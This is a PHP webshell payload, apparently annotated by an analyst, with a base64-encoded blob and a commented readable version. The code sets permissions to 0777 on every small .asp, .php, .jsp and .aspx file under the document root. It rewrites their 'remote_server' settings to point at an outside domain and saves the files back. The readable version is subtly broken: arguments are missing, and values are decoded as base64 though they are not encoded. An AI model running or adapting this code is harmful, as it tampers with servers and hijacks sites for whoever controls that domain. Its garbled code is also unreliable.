<?php
$x1 = 'remote_server *= *[\\\'|\\"]*\\S+[\\\'|\\"]';
$x2 = 'Remote_server = "www.guanjianfalan.com"';
$x3 = 'asp|php|jsp|aspx';
$x4 = '30';
$z0 = 'Nzk0MDIxO0Bpbmlfc2V0KCJkaXNwbGF5X2Vycm9ycyIsIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7QHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTtlY2hvKCItPnwiKTskR0xPQkFMU1snSSddPTA7JEdMT0JBTFNbJ0QnXT1pc3NldCgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKT8kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOihpc3NldCgkX1NFUlZFUlsnQVBQTF9QSFlTSUNBTF9QQVRIJ10pP3RyaW0oJF9TRVJWRVJbJ0FQUExfUEhZU0lDQUxfUEFUSCddLCJcXCIpOihpc3NldCgkX1snUEFUSF9UUkFOU0xBVEVEJ10pP3N0cl9yZXBsYWNlKCRfU0VSVkVSWyJQSFBfU0VMRiJdKTpzdHJfcmVwbGFjZShzdHJfcmVwbGFjZSgiLyIsIlxcIixpc3NldCgkX1NFUlZFUlsiUEhQX1NFTEYiXSk/JF9TRVJWRVJbIlBIUF9TRUxGIl06KGlzc2V0KCRfU0VSVkVSWyJVUkwiXSk/JF9TRVJWRVJbIlVSTCJdOiRfU0VSVkVSWyJTQ1JJUFRfTkFNRSJdKSksIiIsaXNzZXQoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKT8kX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl06JF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKSkpO0JMKCRHTE9CQUxTWydEJ10sMCk7ZnVuY3Rpb24gUlAoJFYpeyRwZXI9QGZpbGVwZXJtcygkVik7QGNobW9kKCRWLGJhc2VfY29udmVydCgiMDc3NyIsOCwxMCkpOyRtc2c9QGZpbGVfZ2V0X2NvbnRlbnRzKCRWKTskY291bnQ9MDskbXNnMiA9IHByZWdfcmVwbGFjZSgnLycuYmFzZTY0X2RlY29kZShnZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbIngxIl0pOiRfUE9TVFsieDEiXSkuJy9pcycsIGJhc2U2NF9kZWNvZGUoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKT9zdHJpcHNsYXNoZXMoJF9QT1NUWyJ4MiJdKTokX1BPU1RbIngyIl0pLCAkbXNnLC0xLCRjb3VudCk7aWYoJGNvdW50PjApe2lmKGZpbGVfcHV0X2NvbnRlbnRzKCRWLCRtc2cyKSl7JEdMT0JBTFNbJ0knXT0kR0xPQkFMU1snSSddKzE7fX19ZnVuY3Rpb24gQkwoJFApeyRBPUBvcGVuZGlyKCRQKTtpZigkQSE9TlVMTCl7d2hpbGUoJEI9QHJlYWRkaXIoJEEpKXtpZigkQiE9Ii4iJiYkQiE9Ii4uIikkRT0kUC4iLyIuJEI7aWYoQGlzX2RpcigkRSkpQkwoJEUpO2lmKEBpc19maWxlKCRFKSYmQGZpbGVzaXplKCRFKTxiYXNlNjRfZGVjb2RlKGdldF9tYWdpY19xdW90ZXNfZ3BjKCk/c3RyaXBzbGFzaGVzKCRfUE9TVFsieDQiXSk6JF9QT1NUWyJ4NCJdKSoxMDI0JiZAc3RydG9sb3dlcihwYXRoaW5mbygkRSxQQVRISU5GT19FWFRFTlNJT04pKSE9IiImJmluX2FycmF5KHN0cnRvbG93ZXIoQHN0cnRvbG93ZXIocGF0aGluZm8oJEUsUEFUSElORk9fRVhURU5TSU9OKSkpLGV4cGxvZGUoJ3wnLCBiYXNlNjRfZGVjb2RlKGdldF9tYWdpY19xdW90ZXNfZ3BjKCk/c3RyaXBzbGFzaGVzKCRfUE9TVFsieDMiXSk6JF9QT1NUWyJ4MyJdKSkpKVJQKCRFKTt9QGNsb3NlZGlyKCRBKTt9fWVjaG8oJEdMT0JBTFNbJ0knXS4ifDwtIik7ZGllKCk7';
$z9 = 'BaSE64_dEcOdE';
@ini_set('display_errors', '0');
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo '->|';
$GLOBALS['I'] = 0;
$GLOBALS['D'] = isset($_SERVER['DOCUMENT_ROOT'])
	? $_SERVER['DOCUMENT_ROOT']
	: (isset($_SERVER['APPL_PHYSICAL_PATH'])
		? trim($_SERVER['APPL_PHYSICAL_PATH'], "\\")
		: (isset($_['PATH_TRANSLATED'])
			? str_replace($_SERVER['PHP_SELF'])
			: str_replace(str_replace("/", "\\", isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : (isset($_SERVER['URL']) ? $_SERVER['URL'] : $_SERVER['SCRIPT_NAME'])), "", isset($_SERVER['PATH_TRANSLATED']) ? $_SERVER['PATH_TRANSLATED'] : $_SERVER['SCRIPT_FILENAME']))
	);
BL($GLOBALS['D'], 0);
function RP($V)  // some file under $DOCUMENT_ROOT with .asp, .php, .jsp, .aspx suffix filename
{
    global $x1; // $x1 = 'remote_server *= *[\\\'|\\"]*\\S+[\\\'|\\"]';
    global $x2; // $x2 = 'Remote_server = "www.guanjianfalan.com"';
    $per = @fileperms($V);
    @chmod($V, base_convert("0777", 8, 10));
    $msg = @file_get_contents($V);
    $count = 0;
	// Change any instances of: remote_server = 'something'
	// into: Remote_server =  "www.guanjianfalan.com"
	// then write it back.
    $msg2 = preg_replace(
		'/' . base64_decode(get_magic_quotes_gpc() ? stripslashes($x1) : $x1) . '/is',
		base64_decode(get_magic_quotes_gpc() ? stripslashes($x2) : $x2),
		$msg, -1, 0
	);
    if ($count > 0) {
        if (file_put_contents($V, $msg2)) {
            $GLOBALS['I'] = $GLOBALS['I'] + 1;
        }
    }
}
function BL($P) // $DOCUMENT_ROOT or a subdirectory
{
    global $x3; // $x3 = 'asp|php|jsp|aspx';
    global $x4; // $x4 = '30';
    $A = @opendir($P);
    if ($A != NULL) {
        while ($B = @readdir($A)) {
            if ($B != '.' && $B != '..') {
                $E = $P . '/' . $B;
            }
            if (@is_dir($E)) {
                BL($E);
            }
            if (@is_file($E) && @filesize($E) < 30 * 1024 && @strtolower(pathinfo($E, PATHINFO_EXTENSION)) != '' && in_array(strtolower(@strtolower(pathinfo($E, PATHINFO_EXTENSION))), explode('|', base64_decode(get_magic_quotes_gpc() ? stripslashes($x3) : $x3)))) {
                RP($E);
            }
        }
        @closedir($A);
    }
}
echo '0|<-';
die;
